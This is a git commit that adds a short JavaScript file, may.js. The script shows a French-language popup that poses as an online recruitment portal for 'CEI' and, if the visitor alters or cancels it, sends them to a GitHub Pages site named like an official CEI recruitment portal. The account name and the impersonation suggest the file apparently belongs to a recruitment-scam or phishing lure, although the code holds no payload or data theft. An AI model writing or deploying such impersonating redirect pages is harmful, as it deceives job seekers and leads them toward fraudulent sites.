f82c1be0cef14af3f676fff2ea3b7bae8b3a8cfa
offernoww <josiahnyeti16@gmail.com>
2025-03-04 22:44:09 +0100

    Create may.js

---
+++ may.js
@@ -0,0 +1,6 @@
+
+var password = 'Recrutement CEI'
+password=prompt('POPUP :Bienvenue sur le portail de recrutement en ligne, cliquez sur OK pour postuler  ','Recrutement CEI');
+if (password != 'Recrutement CEI') {
+location.href='https://offernoww.github.io/CEI.Recrutement.Portail.ci';
+}
